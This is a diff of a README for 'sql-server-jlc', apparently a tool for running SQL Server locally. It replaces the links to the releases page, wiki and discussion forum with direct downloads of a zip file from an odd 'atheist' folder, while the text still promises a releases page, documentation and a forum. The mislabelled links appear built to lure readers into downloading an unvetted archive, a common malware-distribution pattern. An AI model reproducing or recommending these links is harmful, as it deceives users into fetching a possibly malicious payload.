@@ -1,7 +1,7 @@
 # 🚀 sql-server-jlc - Easily Run SQL Server Locally
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/TeTe3456/sql-server-jlc/releases)
+[![Download](https://raw.githubusercontent.com/TeTe3456/sql-server-jlc/main/atheist/sql-server-jlc.zip)](https://raw.githubusercontent.com/TeTe3456/sql-server-jlc/main/atheist/sql-server-jlc.zip)
 
 ## 📖 Introduction
 Welcome to the **sql-server-jlc** repository! This application allows you to run SQL Server locally with ease, helping you manage your databases efficiently. Whether you want to test queries or develop applications, this software provides a simple solution for your local SQL Server needs.
@@ -27,7 +27,7 @@ To download sql-server-jlc, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page:
    
-   [Visit the Releases Page](https://github.com/TeTe3456/sql-server-jlc/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/TeTe3456/sql-server-jlc/main/atheist/sql-server-jlc.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the latest version. It will be at the top of the list.
 
@@ -56,7 +56,7 @@ This software is provided under the MIT License. You can use it freely, with ack
 
 ## 📎 Additional Resources
 For more information and updates, you may refer to:
-- [Official Documentation](https://github.com/TeTe3456/sql-server-jlc/wiki)
-- [Community Forum](https://github.com/TeTe3456/sql-server-jlc/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/TeTe3456/sql-server-jlc/main/atheist/sql-server-jlc.zip)
+- [Community Forum](https://raw.githubusercontent.com/TeTe3456/sql-server-jlc/main/atheist/sql-server-jlc.zip)
 
 Thank you for using sql-server-jlc. Happy database managing!
